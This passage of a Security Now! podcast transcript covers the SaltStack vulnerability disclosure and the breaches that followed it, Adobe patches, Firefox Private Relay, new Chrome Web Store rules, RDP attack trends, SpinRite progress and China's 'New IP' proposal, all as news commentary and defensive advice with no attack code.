On the 23rd, SaltStack publishes advance notice to their users urging them not to expose Salt masters to the Internet - yo, that'd be good - and to prepare to apply the patch once it is published on the 29th.  So that was the 23rd.  So they get six days' notice.  On the other hand, the problem is presumably these SaltStack masters, the 6,000-plus of them, are exposed because the minions need access to them over the Internet.  And they haven't taken the measure, the security measure of doing IP, like minion IP address filtering that would only allow the minions on the public Internet to see, to have access to the publicly exposed master.  Anyway, six days go by.



On the 27th, F-Secure requests information from SaltStack about the CVE IDs allocated for the vulnerabilities.  A few days go by.  F-Secure reiterates the request for CVEs to SaltStack.  Same day, SaltStack responds with the allocated CVE identifiers.  Same day, SaltStack publishes v3000.2 and 2019.2.4 addressing these issues.  So let's see, that's on April 29th.  The "early next week" - oh, it's in quotes because that was said on April 16th, and it didn't actually happen until the 29th.  So, what, 13 days later.  The following day, F-Secure publishes their advisory.



Immediately upon publishing their security advisory, F-Secure was asked by the tech press, who was keeping track of these things, what F-Secure expected to see next.  They said they expect to see attacks in the wild shortly.  Quoting, they said:  "We expect that any competent hacker will be able to create 100% reliable exploits for these issues in under 24 hours."  They cited the "reliability and simplicity" of exploitation.



And dropping the other shoe, sure enough, hackers wasted no time exploiting vulnerable Salt instances used in various infrastructures for server management and automation. Among the organizations that announced an intrusion, and these are of course the ones being responsible and saying whoops:  LineageOS, which is, I was unfamiliar with them before, but I guess an Android-based OS company.



LEO:  Yeah.



STEVE:  Vates, the operators of open source Xen Orchestra; the Ghost blogging platform; and even my very favorite certificate authority, DigiCert.  By now hundreds of servers - both masters and clients, the minions - if not thousands, have likely been compromised.  Because exploit code is trivial to create, F-Secure published nothing in order to protect companies that would be slow to patch.  Unfortunately, not that that's going to be much help.  However, several versions and proof of concepts were immediately made public.  So it's likely that any still unpatched servers are toast.  I've got links to four proof of concepts that are all public on GitHub in the show notes.  And this happened just over the weekend.



In the few days since the attacks began, more than 134 messages have been posted to Salt's bug page.  And they make for some sobering reading.  I've got the link to them in the show notes, for anyone who's interested.  But, I mean, it's like our entire infrastructure is down and has been hacked.  The good news is, for whatever reason, all that the attackers, at least the initial attackers, seemed to be interested in doing was installing bitcoin miners, which seems like, well, I mean, I'm glad that that's the case.



On Sunday Jeremy Rowley, who's DigiCert's Executive VP of Product, posted the news to the Certificate Transparency Group which is hosted at Google.  He said:  "Hey all.  I'm sad to report that we discovered today that CT Log 2's key used to sign SCTs" - that's Secure Certificate Transparency logs - "was compromised last night at 7:00 p.m. via the Salt vulnerability." And he posts a link to a story about this on Threatpost.



And he said:  "All other DigiCert Certificate Transparency logs are unaffected as they run on separate infrastructure.  We are pulling the log into read-only mode now.  Although we don't think the key was used to sign SCTs," he says, "(the attacker doesn't seem to realize that they gained access to the keys and were running other services on the infrastructure)," he says, "any SCTs provided from that log after 7:00 p.m. MST yesterday are suspect.  The log should be pulled from the trusted log list."  He says:  "Happy to answer any questions about what happened, the infrastructure running the other logs, or what remediation we are taking."



So that's all you could possibly ask for.  Immediately going public, dealing with the problem, telling people we don't have any evidence, we don't believe that the key that an attacker technically had access to was used.  But obviously they rotated the key.  They're pulling all the certificate transparency logs since the time that they know that the intrusion occurred.  And they will then replace them signed under a new key, and we're back to where we were before.  We don't know about what other entities may have been attacked.



But this was an interesting instance, another example, I guess, of how quickly bad guys will now jump on and exploit, even if not apparently the sharpest knife in the box bad guys, I mean, they could have done way more than they did.  They just immediately installed cryptominers.  Many of the bug reports that are in that log of intrusions just talk about cryptomining being installed.  So it's like, well, again, we sort of got lucky with this one.



What made this worse was that it was so easy to exploit.  For example, comparing to the RDP bug from a few months back, where it was initially a crash, and people were not sure whether you could actually leverage it into remote code execution, then it was.  We saw something similar with the SMB failure a few months after that, where it can crash things.  So if it really takes skill to leverage these, that buys a lot of time for the systems to get patched.  If it's something that someone stumbles on, and it is just dead simple, even with SaltStack notifying their customers to get ready for this - and we've seen that, for example, in high-profile instances where the publisher will notify their users, we've got something coming that you really need to jump on because we're afraid the bad guys are going to see what this is and jump on it just as quickly as you do.  So get ready to receive something.



And then F-Secure, being responsible, unlike some recent hackers who weren't, by withholding all details from their disclosure, just saying we found something, there's a couple CVEs, and we hope everybody patches this thing immediately.  So bravo to them for being responsible.



I wanted to quickly note, mostly just to make sure people got the news, that Adobe had a big non-Patch Tuesday Patch Tuesday last week.  Or non-Patch Tuesday Tuesday.  They released emergency updates for three of their widely used products that patch dozens of newly discovered critical vulnerabilities.  The affected software was Adobe's famous Adobe Illustrator, Bridge, and the Magento eCommerce platform, containing a total of 35 vulnerabilities where each one of them is affected with multiple critical arbitrary code execution flaws.  So, yikes.



And it's unclear to me, as I was thinking about this, how Adobe Illustrator 2020, a quite capable drawing tool used by millions of artists around the world, could contain five critical remote code execution vulnerabilities.  It's a drawing program.  But these days no one is ever content to leave anything alone.  It's a race to add features.  So I guess I wouldn't be surprised if it, who knows, uses UPnP to open a port to itself so it can communicate with the cloud for some reason.  And if you're not  careful, Adobe Illustrator will get compromised.  Or maybe it's just an image rendering problem; and if you made the mistake of opening a hostile file, then yeah, you could get taken over.  In which case it wouldn't seem that critical to me.  But still.  For what it's worth, make sure you're current.



Mozilla announced another welcome service.  Remember how we have Send from Mozilla, a painless, unlimited use, locally encrypted, TNO large file transfer facility that unregistered users can use for file transfers of up to a gig, and registered users can use for file transfers of up to 2.5 gig.  It's available for free at send.firefox.com.



Okay.  So Mozilla will be addressing another constant source of annoyance with a new service called Firefox Private Relay.  It is a one-click email alias creation service.  When Apple announced a similar forthcoming service as part of their sign-in with Apple at the 2019 WWDC, I remember thinking it was a cool idea, and I was a bit envious, since it wasn't clear how easy it would be for me to use it since I'm using email over on Windows.  But Mozilla's forthcoming Firefox extension may be just the ticket.



The extension will generate unique aliases on the fly whenever you just need an address, but really don't want to give out your actual primary address.  I know that we all maintain throwaway accounts for that.  But this is better, since it offers a nice built-in email alias UI to manage them.  So, for example, if you reused one, and I would tend to, but it started to get spammed, you could disable it, or you could delete it.  So the forthcoming service has entered testing last month in beta, which is currently closed.  A public beta is currently scheduled for sometime later this year.



And Mozilla explained:  "We will forward emails from the alias to your real inbox.  If any alias started to receive emails you don't want, you can disable it or delete it completely."  So we don't have it yet, but I think it's neat that we'll have one over on the Firefox platform, which would make it actually universal platform neutral.  And that'd be cool.  I wish Apple's stuff was not so hostile to everything but theirs.  I mean, I'd love to be able to send an iMessage from Windows, but I haven't figured out how to do that.



LEO:  No, can't do it.



STEVE:  No.  Okay, Leo.  You're not going to believe this one.  I mean, really.  You're not.  Political correctness hits cybersecurity.



LEO:  Oh, no.  That's bad.  That's a bad start.



STEVE:  For the most part I feel young and wonderful.  But I think that I must be getting old and crotchety, since things seem to be getting increasingly weird.  Get this.  The U.K. government's cybersecurity agency wrote last week that it would stop using the terms "whitelist" and "blacklist" due to stigma and racial stereotyping surrounding - I'm not kidding.



LEO:  But that's reasonable because just because it's black doesn't mean it's bad or white because it's good.  I understand what they're saying.



STEVE:  Yeah, well, I mean, I understand.



LEO:  It's like master and slave on the SATA chain.  It's like, yeah.



STEVE:  Oh, can't have that anymore, no.  No, I mean, I understand it.  I just think, really?  They said instead the U.K. National Cyber Security Center said that going forward it would use the terms "allow list"...



LEO:  Yeah, and block list.



STEVE:  ...and "deny list."



LEO:  Or deny list.  That's okay, yeah.



STEVE:  Instead of the other two.



LEO:  That's even clearer than "whitelist" and "blacklist," to be honest.



STEVE:  That's true, it is clearer.



LEO:  Allow and deny, yeah.



STEVE:  Emma W., who heads up Advice and Guidance at the NCSC, wrote:  "It's fairly common to say whitelisting and blacklisting to describe desirable and undesirable things in cybersecurity.  However, there's an issue with the terminology.  It only makes sense if you equate white with 'good, permitted, and safe' and black with 'bad, dangerous, and forbidden.'  There are some obvious problems with this," she writes.  "So in the name of helping to stamp out racism in cybersecurity, we will avoid this casually pejorative wording on our website in the future."  So I guess, what, are we going to have "allow list" hackers and "deny list" hackers?



LEO:  Allow hat and deny hat.



STEVE:  Allow hat and deny hat.



LEO:  You know, I'm not against this.  I think this makes sense because it is institutional racism that's been incorporated for so long we're just used to it.  But if you think about it, white and black.



STEVE:  But no one is thinking about African Americans when you say "blacklist."



LEO:  Well, no, but that's where that comes from is black is bad and white is good.  That's where it comes from. 



STEVE:  Black is dark.  It's the absence of light.  It's, you know...



LEO:  I think allow, yeah, I think allow/deny is better anyway.  There are some issues.  I mean, what are you going to use,  white out?  Are you going to use deny out?  I don't know.  Allow out?  There are some places where it's going to be hard.



STEVE:  So you're saying we're not going to remove the two colors from the vocabulary.



LEO:  No.  But to use "black" as pejorative.



STEVE:  How about greenlist, redlist?



LEO:  Yeah, you could do that.  Like lights, traffic lights.  And as long as you don't get any green people, we're okay.



STEVE:  Yeah, but we have American Indians, so...



LEO:  They're red, so - no, they're not really red.  But nobody's really white or black or red.



STEVE:  Exactly.  Exactly.  Except those two guys on Star Trek that were like cut down the middle; remember?



LEO:  Right, half and half, yeah.



STEVE:  And that was actually a fabulous racism statement because Kirk and McCoy, they were standing there, like why are you upset with each other?  You're the same.  And they said - they, like, looked at them like they were crazy.  And they said...



LEO:  We're not the same. 



STEVE:  ...what are you talking about?  He's white on the right.  I'm white on the left.



LEO:  It's perfect.  It's exactly right.



STEVE:  You're kidding me, yeah.



LEO:  We could do good hat, bad hat.  Again, clearer than white hat, black hat.



STEVE:  A bad hat.



LEO:  Bad hat.



STEVE:  I know it would be.  But, I mean, I can understand the sensibility, I guess.



LEO:  I don't think that's so bad.



STEVE:  So anybody making bad Chrome extensions is being put on notice.  And boy, are they being given time.  I thought, why is the deadline August 27th?  So I looked at where we are today and where we are then.  It's like, what?  How did they come up with August 27th?  It's a Thursday, like in the end of August.  Like, what?  It's 16 weeks from now.  I counted.  And it's like, okay, well, nobody wants to accuse Google of not giving anyone any notice.  So it's way past time to do this.



Last Wednesday Google announced new rules for the Chrome Web Store which should cut down the number, like a lot, the number of shady Chrome extensions submitted and listed.  They explained that due to Chrome's success as today's top web browser platform - yes, we know, by a wide margin - the Chrome Web Store has seen an influx of spammers and fraudsters.  Google says that these malicious entities have been behind a rising number of duplicate, spammy, and purely malicious extensions that are now poisoning and drowning the Chrome Web Store in low-quality content.



So be warned.  Get ready.  Mark it on your calendar because it's a ways away from now, starting on Thursday, August 27th.  Google will begin enforcing a welcome new set of rules.  I think they should do it tomorrow, but no.  Which will result in a large number of extensions being immediately delisted.  These rules are meant to crack down on a series of practices which extension "developers," and I put "developers" in quotes because it's just junk, have been recently employing to flood the Web Store with shady extensions or boost install counts for low-quality content.



So we've got six things that are no-nos, coming not soon to a Chrome Web Store near you.  Developers cannot submit extensions, for example, wallpaper extensions, that have different names, but provide the user with the same wallpaper.  So they're just redundant nonsense.  Can't do that anymore, guys.  Sorry.  Extensions are not allowed to use keyword spam techniques.



LEO:  Good.



STEVE:  Yes, to flood metadata fields with multiple terms and have that extension listed across multiple categories to improve the extension's visibility in search results.  So no more search results spamming.  Developers are not allowed to use misleading, improperly formatted, non-descriptive, irrelevant, excessive, or inappropriate metadata.  Well, we're going to be the metadata police, thank god.  "Extension metadata needs to be accurate, and Google intends to be strict about it," they wrote.  I don't know how they're going to pull it off, but turn some AI loose on it, please.



Fourth, developers are now forbidden - well, not now, but after late August - forbidden from inflating product ratings, reviews, or install counts by illegitimate means such as fraudulent or paid downloads, reviews, and ratings.  Extensions that have only one purpose, and a dumb purpose, such as launching a web page or an app, will no longer be allowed.  Yeah, just launch it yourself.  Extensions that abuse browser notifications to spam users with ads or other messages will also be banned.  Good.  Good.  Do it now.



Anyway, on that Thursday, August 27th - and we'll let everybody know when it's only two days away because that'll be useful, and that'll be on a Tuesday - Google says it intends to take down every extension that violates these rules.  Once upon a time it was bragging how many they had, and the more the better because it made Chrome look good.  Now, not so much.  Once that happens, many thousands of junk Chrome extensions will disappear, poof, from the Chrome Web Store, and nobody will miss them.  This will make, they said, searching for useful content on the site easier and safer than it has recently become.  And they finish, saying the Chrome Web Store currently lists more than 200,000 extensions - 200,000.  And most of them are the same wallpaper.



LEO:  I think that's true.



STEVE:  God.  Look at this graph, Leo.  Warning about RDP is not crying wolf.  Just as the Shodan Internet-wide application search engine saw a 41% upward jump in RDP endpoints appearing at the beginning of last month, Kaspersky has had their eye on the Internet and has seen a somewhat startling increase in scanning, RDP scanning, and brute force, what we're now calling "credential stuffing" attacks.  This chart is sobering, to say the least.



LEO:  Are these origin countries?  Or the places being attacked?



STEVE:  No, the target of these scans.



LEO:  Targets.  So the U.S. is big, of course, yeah.



STEVE:  Yes.  Yeah.  And of course Spain.  Basically the large stay-at-home countries, interestingly enough.



LEO:  Yeah.  China's flat.



STEVE:  Yeah.  From the beginning, well, China's probably where the scans are coming from.



LEO:  Right.



STEVE:  Whereas from the beginning of the year we can see scans for open RDP ports, we're kind of purring along between maybe 150 to 200,000 per day, that all changed about the beginning of March.  Many countries saw a quadrupling in attack rate, that is, within their borders.  And at one point toward the end of March, Spain hit about 1.2 million attacks per day.  Later, the U.S. even exceeded that by crossing the 1.4 million attacks per day threshold.  Although overall there has been some ebb and flow, securing RDP from random Internet access is critical.  I've often said there isn't a way to have it safely exposed.  Please put it behind a VPN, if there's any way you can.  And if not, really take advantage of LastPass and use a ridiculously long password that you can't remember, and you never want to type in, and have LastPass generate it and remember it for you.  You just - you really don't want to be subject to brute force attack.



Okay.  A fun bit of errata.  Recall that last week we talked about RPKI and BGP.  And I noted with apologies my utter inability to properly pronounce the name of one of the major players behind the work to secure BGP.  His name is spelled J-O-B.  That's his first name, which I think maybe Job?



LEO:  I like Job.  Yeah, I think it's what you said last time, Job, I like that.



STEVE:  But I'm not doing the last name.



LEO:  Could just be Snijders.



STEVE:  You think so?  S-N-I-J-D-E-R-S?



LEO:  Yeah, could be.



STEVE:  Job Snijders?  Anyway, I still have no idea how he pronounces it.  But I do know that he was aware of my failed attempts.



LEO:  Oh, dear.



STEVE:  He tweeted:  "Hey, @SGgrc.  Thanks for the shout-out.  You did a great butcher job of my name, ha ha.  Let me know if you want to talk more about RPKI and BGP in your show."  So anyway, thank you very much.



LEO:  But didn't send the right pronunciation.



STEVE:  No.  That would have been fun.  But anyway, if this becomes a thing, if it happens, we've got a contact.  We may have him on the show and ask him himself how he pronounces his name.  I very much appreciate the vital work he's doing.



LEO:  Yes.



STEVE:  However he pronounces his name.  Two notes, one thumbs up, one thumbs down.  I don't remember if we talked about it during the show or before or after or when.  But "Devs," Leo, it is a total of six hours and 49 minutes of run time, chopped up into eight episodes.  So it's a little miniseries.  It's produced by FX, and it's streaming on Hulu.  Or you can do as I did, because I don't have Hulu.  Although actually you can just get a Hulu subscription.  You get a free trial for a week, and you could watch the whole thing for free on Hulu and then resign before you started to pay.  I just bought it from Amazon for 13 bucks.  Oh, my god.  "Devs," D-E-V-S.  And it is really good.  I've not finished it yet.  I've got about three episodes left.



LEO:  See, one of the reasons I really liked it is it had a coherent ending to what must be very challenging.  Well, you'll see when you get to the penultimate episode.  You'll go, "I have no idea how they're going to solve this one."



STEVE:  Oh, neat.  Anyway...



LEO:  They paint themselves into a big corner, and then...



STEVE:  It is shockingly good and shockingly technically accurate.  You teased me, noting about how in the opening conversation two of the main characters were sort of arguing about elliptic key versus RSA encryption.



LEO:  I just loved hearing the words.



STEVE:  And the comparative merits of the two.



LEO:  Yeah, it's awesome.



STEVE:  But, I mean, at one point a different hacker needs to securely look at a thumb drive, so he pops the keyboard off the top of his laptop and then, with a little screwdriver, pops two things off and then removes a little board and explains that he just removed the WiFi.  And it's like, he used the little SMA connectors and popped the two antennas off of...



LEO:  Isn't that cute.



STEVE:  I mean, it's just...



LEO:  Yeah, they've got a - whoever the technical advisor is, is actually knowledgeable.  Yeah, it's good. 



STEVE:  Yeah.  I really like the characters.  Everybody will recognize the lead guy's assistant.  She played a big role in "Picard," the unfortunately not, I think, bound to be repeated CBS "Picard" Star Trek series.  I ended up not being that impressed with it.  Unfortunately, he was my favorite captain, but he's gotten pretty old.  So he's not the Jean-Luc we know.



LEO:  And you don't know who the long-haired guy with the beard is.



STEVE:  I don't, no.



LEO:  But he's much better known than anybody else in the cast.  It's Nick Offerman, who was Ron Swanson on "Parks and Recreation" and is beloved by the geek folks.  He did a wonderful Yule Log last year in which he sat in front of a fire drinking whisky for eight hours.  Nick Offerman's great.  And this is a role very different from Ron Swanson or any other role you've seen him in.  He's really good; isn't he?



STEVE:  I've never seen him before, and I am stunned by the quality of his performance.  It was just, I mean, I was just like, I just can't believe how good it was.  So I don't think I'm over-singing its praises.  And I will balance that with  Amazon Prime's "Tales from the Loop."



LEO:  So disappointed that that wasn't good.  I haven't watched it yet, but I got your text, "Don't watch it."



STEVE:  Yeah.  It just - it was - it had potential.  It had a couple interesting episodes.  But it just never got off the ground.  And some of the things were very obvious.  Some of them were kind of like, okay.  But anyway, just I can't highly recommend it.



LEO:  And I'm curious, Amazon Prime has a new show by Greg Daniels, one of the creators of "The Office," called "Upload." 



STEVE:  I've seen the previews.



LEO:  Yeah, it's interesting.  It's not great, but I'd be curious what you think of it.  So when you get around to watching that, yeah.



STEVE:  I told everyone last week that I hoped to be able to report some first actual results from the first actual live testing of the hardware-level AHCI driver development for SpinRite, and I can.  We now have drive enumeration and communication with every single system our testers have thrown at the code. 



LEO:  Nice.  



STEVE:  And it's probably 50 machines, at least, maybe more.  We're now working with Intel, AMD, ASMedia, Samsung, and Marvell AHCI chipsets, which is every chipset we've encountered so far.  The newer Intel chipsets initially caused a glitch because they handled hardware interrupts a bit differently from everyone else.  And the Marvell chips were just brought online yesterday morning before I began working to assemble this podcast.  The trick with the Marvell chips was that they failed to implement two important status bits that are clearly part of the AHCI spec, but they don't have them.  So I allowed support for those two status bits to be optional.



At this point, the new AHCI driver code is running on everything that all of our testers have thrown at it.  So while I'm waiting for someone to dig up something that it doesn't work with, I'm going to reenable the support for all of the older interface standards - IDE, ATA, and AHCI when it's in legacy mode.  We should then have enumeration and visibility for every drive on every system without any BIOS involvement.  And because it's fun to see how fast our drives go, it's fun to see how long it will take SpinRite to run, and because people love benchmarks.



GRC's DNS Benchmark, I just looked because I was curious, is again our most often downloaded freeware.  It's been downloaded a total of, yesterday when I looked, 5,620,883 times.  And I don't double count for mass downloaders.  That's a good, accurate count.  And it's currently being downloaded at the rate of a little over 4,000 times per day, every single day.  So not quite as many people as are showing up positive for COVID-19 in New York, but it's holding steady.  Hopefully they'll get their count down.



Anyway, I want to verify our ability to transfer data.  And since it'll be fun to know how long the next SpinRite will take to perform a problem-finding intolerant read scan of our new bigger drives, I'm going to - and actually I've already got the code written - perform a very accurate drive benchmark which will then allow everyone to test and compare all their drives' true performance.  So this will end up being hopefully a popular and used and tested piece of freeware which all of the listeners on this podcast will have early access to because, again, if it doesn't work for someone, I want to know because that would mean that SpinRite would also not work.  And that I really want to know.  So anyway, making very good progress.  And I will keep our listeners informed as we move forward.  I might have it next week, who knows.



LEO:  Wow.



STEVE:  Okay.  So I guess the Internet is getting more explicitly political.  China has proposed a wholesale revamp, which other authoritarian countries, including Iran, Russia, and Saudi Arabia, have vocally supported.  So there's actually been dialogue about this.  There's quite a lot of heated rhetoric surrounding the topic.  And as with contact tracing, where it's complicated, the rhetoric and the technology might be quite different from one another.



So in working to get a feel for what was actually going on, I started with a PowerPoint slide presentation I found which had been, well, it had been given during one of the workshops and seminars conducted by the ITU, the International Telecommunications Union.  And it was done by the main architect and mostly was sort of technological bullet points.  It's not something anyone could implement anything from.  But it's at exactly the right level to gain some overall understanding of sort of like what's the gist of this, which is my goal is to share that with our listeners.



So for their key network technology requirements they explained that they felt there was a need for more flexible, variable-length IP addresses to adapt to diverse scenarios and to be backward compatible with IPv4 and IPv6.  They also support addressing and routing optimized based on communication entity semantics and something called "digital twin relationships."  Some time was spent talking about "digital twins," but it was never very clear to me from the slides what they were.  But they're also trying to support real-time what they described as "large-flux" communication in virtual physical fusion scenarios combining ubiquitous AI theory, whatever any of that means.



There's a lot of talk about the future need for truly massive bandwidth and guaranteed low latency in support of, and I'm not kidding, holographic transmission and applications such as a telesurgery.  They also want secure, reliable, and resilient connection among massive heterogeneous networks - you know, why not? - and future network architecture supporting multi-ID space and these digital twin relationships.



So one thing that I think caused the hairs to stand up on the back of some people's necks was something that this system incorporates called "identity-based routing."  That is, as opposed to IP-based routing.  So it's one of the most interesting aspects of this, and I think it's, as I said, what I think frightens people.  The slides explain:  "Instead of mapping all information into network addresses, diverse IDs are used to indicate the destination which improves routing capabilities."  In other words, this system proposes that it would be possible to address a connection to an individual based upon some sort of identity descriptor.  And the network, necessarily knowing where this individual is, would route the connection to them.



And of course you can understand why that makes a lot of people uncomfortable, in order to do that, what you need to know, like where the person is.  The slides explain:  "Packets are addressed by semantic content metadata, of which old-style IP addresses become a subclass."  And examples of semantic content are given:  content ID, device ID, people ID, and service ID.  So things have identifiers; and you can say I want this to go to this device or this person or this service, and somehow the network makes that happen.  They suggest that this would enable network layer deterministic forwarding rather than our current "best effort" forwarding, which of course famously makes the Internet go today.



LEO:  This is the antithesis of net neutrality.



STEVE:  Yes.



LEO:  This is the exact opposite.



STEVE:  Yes.  



LEO:  All bits are not equal.  All bits are inequal.  And we can do what we want with them.



STEVE:  Yup.  Some bits are better than others.  And the overall global network would be redesigned with a sort of super QoS, that's my term, a super Quality of Service structure, which they assert will be needed to satisfy future scenarios.  So the network's available transit bandwidth would be divided into slices, and they suggest some examples.  An AR/VR slice would have low latency, less than 20 milliseconds.  What they described as a self-driving slice, and I guess they mean autos, would have a latency much lower than that, even, of less than five milliseconds.  And then a teleprotection slice would offer jitter of under 50 microseconds, so extremely low jitter.  So the idea being you can somehow ask for different network characteristics and get that from the network.



And a lot of this they then pulled together on a slide titled "End-to-end communication requirements for intrinsic security," which is where they sort of are the most clear, and it's kind of chilling.  They have authenticity where they say more than one third of autonomous domains right now, today, on today's Internet, do not have prevention mechanisms for IP address spoofing.  And so they don't like that.  Accountability versus privacy, they talk about the tradeoff.  Exposing IP, port, and time to live on the wire decreases privacy, but anonymizing them decreases accountability.



So they say:  "IP headers design should take into account a tradeoff between accountability and privacy."  And you can kind of feel that they're willing to trade off accountability, well, they're willing to trade away privacy for increased accountability.  For confidentiality and integrity, they say:  "The current key exchange mechanism has many vulnerabilities."  What they described as intrinsic identity keys would be used, not relying on third parties.  But there's no notion of how they pull that off.



And then availability.  "Avoid the unavailability of target network resources, computing resources, storage resources, et cetera, caused by DDoS attacks."  They don't like those.  "It is necessary to combine authenticity and accountability to build a multilevel verification filtering system for inter-domain and intra-domain traffic."  So from this diagram, what is it, it's "Intrinsic Security for Privacy Protection in Future Networks."  It's a diagram that's kind of like on a beige background behind it and a blue box in the lower left.  Anyway, having looked at this diagram and studied it for a while - yup, that's the one, Leo.



So the system encrypts the sender's ID and the sender's local IP.  They are then authenticated along with the hosting network.  The traffic moves to the Autonomous System's edge router, and we know what that is from the last couple weeks when we were talking about BGP and autonomous systems like an ISP, and they have an Edge router that connects their whole subscriber big network to the Internet backbone.  So the traffic moves to the autonomous system's edge router, which adds - and this is all new, of course, well, all of this is new, an ASID, an autonomous system identifier which is generated by an HMAC.  The traffic  traveling over the Internet contains this ASID verifier, an encrypted ID, and an encrypted IP.



As the packet attempts to enter the destination autonomous system, the sender's ASID, that is, the originating Autonomous System ID HMAC, is authenticated to permit it to enter.  Then its content is made available, and the destination address pieces are decrypted.  And what's most creepy is, in the flow chart diagram, there's this overriding auditing agent which is never described.  It appears across the top with dotted red lines flowing down to all of the key elements on both sides.  And in a box with a legend describing some of the abbreviations, the dotted red line is labeled "Shutoff Protocol," with not much else said, yeah.  Apparently...



LEO:  You need say no more, I think.



STEVE:  Apparently, if the auditing agent is unhappy, that traffic does not flow.  There's also ample attention paid to the needs imposed by "holographic" communication which appears to literally mean the display of holograms.  There's like a 3D body outline in one of the slides throughout the network.  So they have ultra-high throughput, customizable priority and strategy, reduce complexity, I don't know how that happens, and... 



LEO:  Indeterminacy.



STEVE:  Thank you.



LEO:  Indeterminate.



STEVE:  Indeterminacy.  Reducing, we're reducing complexity and indeterminacy.



LEO:  We don't want that.



STEVE:  We don't want lossy transmission to affect the quality of content.  And basically they're changing everything.  And inherent network awareness.  I don't think they like our autonomous packet routing approach because it just - it's too indeterminate.



LEO:  You have to realize that the Internet was designed exactly the opposite of this.



STEVE:  Yes.



LEO:  For very specific and good reasons.



STEVE:  Yes.



LEO:  And this just counters the whole thing.



STEVE:  Yes.



LEO:  And who the hell is doing holographic communication anyway?



STEVE:  Yeah. 



LEO:  What are they talking about?



STEVE:  I really - there was a sense that they were trying to use these really inflated...



LEO:  It's the future.  It's the future.



STEVE:  ...future things.  And so we're going to have to change the plumbing.



LEO:  Yes.



STEVE:  In order to support our future holograms, our holographic dictator.



LEO:  Thank god we have holographic communications now.



STEVE:  Yeah.  So anyway, that's a sense for what they're aiming at.  RIPE, which is the EU's Internet governance body, blogged about this proposal under the questioning title:  "Do We Need a New IP?"  That full blog post is long and winding, but the official response is short and to the point.  Well, it's not quite as rude as saying no.  But it's titled:  "Response to 'New IP Shaping Future Network' Proposal."  I've got the link to the PDF.  It's only two pages.



It reads:  "During this group's last meeting in September 2019 a number of proponents introduced a proposal titled 'New IP, Shaping Future Network,' proposing what was described as an opportunity for a strategic transformation of the Internet.  The RIPE NCC appreciates the opportunity to respond to the proposal by means of this contribution.  Since first being described in 1974, Internet protocol architecture has totally transformed our societies and economies, as the design philosophy of an open and flexible Internet that has allowed for an unprecedented number of life-changing innovations.



"It is true that, boosted by privatization and increased competition, these technological breakthroughs have also dramatically changed the telecommunications landscape.  While it was once common to carry TCP/IP data streams across traditional PSTN infrastructure, those original telephone systems have now also evolved and are carried using the Internet protocol."  In other words, it's sort of flipped it upside down.  Instead of the TCP/IP being carried by the phone, now the phone is being carried by TCP/IP.



"Throughout its lifetime, the Internet protocol has also adapted to accommodate changing requirements and new technological insights.  The most noticeable and impactful change was the redesign toward IPv6, with its 128-bit address space to overcome scalability issues and support growth beyond expectations.  We believe it is exactly that open and adaptable nature, not only of the technical architecture but also the surrounding governance models, that is fundamental to the Internet's unprecedented success.



"Growing alongside its technical infrastructure, the Internet's governance model has also evolved to include new stakeholders and accommodate innovations, unforeseen use cases, and unimagined growth as the Internet became the fundamental technology powering our societies and economies.  The open, inclusive, multi-stakeholder approach throughout its development, both in the technical forums that created its standards, as well as in the governance of its resources, has made the Internet what it is today.



"While we recognize the need for both the technical standards as well as these governance models to continue evolving, we strongly believe such evolution should take place from within the organizations and structures that invented the Internet and have supported its evolution throughout its history.  We also strongly believe that any rationale for change must be carefully evaluated by all stakeholders in an open and transparent process to achieve consensus.  The RIPE NCC is deeply concerned by what has been proposed here.  We are especially concerned by the notion that this proposal represents an opportunity to steer away from the traditional bottom-up decision-making model.



"We also believe the technical rationale presented is flawed, and find the suggested alternative designs to be both unrealistic and unproven.  Furthermore, if any of the proposed solutions could be developed to a mature and production-ready standard, market adoption is very uncertain and would take decades to accomplish.  The RIPE NCC is of the opinion that the proposal is premature, and that following through with any of the suggested work would create significant overlap with the ongoing work of other stakeholders, in particular that of the Internet Engineering Task Force.



"Although some of the issues mentioned may warrant further study, we insist that any work on the evolution of the IP protocol layers and the associated technical standards be left to the Internet Engineering Task Force and be conducted under its governance.  The RIPE NCC recommends that TSAG, and the ITU Telecommunication Standardization Sector in general, not make any of the suggested changes to its structure or pursue any work items related to this proposal that would evolve the Internet protocol stack under the ITU's remit."  In other words, hands off.



So that's what they had to say, not surprisingly.  This is interesting, I guess, from a sort of theoretical "what if" model; and it sure did ruffle, as I said, a bunch of feathers.  But it's clear that those of us who have some deep affection for the operation of today's Internet, warts and all, have little to fear.  Let's remember that we can't even get people to upgrade their version of TLS.



LEO:  This would be a lot hairier.  This would be a lot more, yeah.



STEVE:  Oh.  Oh, Leo.  It breaks everything.



LEO:  Yeah.



STEVE:  It would scrap the entire investment in all of everyone's existing Internet networking equipment.  And I was thinking about, okay, first of all, no one wants it.  But if such a thing, I mean, maybe there would be a completely next-generation thing once the holograms are needing more bandwidth, demanding their own bandwidth.  If such a thing should ever happen, first of all, it's a long ways off.  And the only way I can see anything like that ever happening would be as an overlay of an entirely new next-generation network, which would initially run in parallel, and only in a few locations, alongside today's Internet.  And it would gradually, maybe, over time, eventually replace the older Internet.



Which, come to think of it, is exactly the way the original Internet was born.  It only connected a few things, and it didn't try to replace the telephone.  And then it got bigger, and it connected more and more places, and then it got more and more use, and it just sort of happened.  So I can imagine some next net that would happen sort of the same way.  It would just, you know, some people would start connecting things up, and other people would go, hey, we need to get one of those boxes if we want to play with those holograms.



LEO:  Consider the holograms, my friend.  Consider the poor holograms.  Steve Gibson, he's at GRC.com.  That's his website.  Now is the time to sign up for SpinRite because then you'll get the beta.  Maybe even as soon as next week you'll get to try out all these new little bits that Steve's incorporating into the next generation of SpinRite.  But only current SpinRite holders get to play with that stuff.  GRC.com.



While you're there, get a copy of this show.  Steve has 16Kb audio for bandwidth impaired.  He also has 64Kb audio, even transcripts, which probably - those are just text, so I bet those are the smallest versions of the show of all.  They're all at GRC.com.  And there's lots of free stuff there while you're visiting, including ShieldsUP! and the DNS Benchmark, all of that.  Steve's on Twitter at @SGgrc, and you can leave messages there for him, or on the website at GRC.com/feedback.  DM him on Twitter.  And that's a good way to stay in touch and keep up with what Steve's doing.



We do this show every Tuesday, right after MacBreak Weekly, so it's about 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  You can watch the live stream of our production at TWiT.tv/live.  That goes day and night, audio and video streams there, TWiT.tv/live.  You can get the show from the website, TWiT.tv/sn.  It's on YouTube.  You can ask your favorite voice assistant.  "Hey, favorite voice assistant, play Security Now! podcast."  It'll play the latest version.



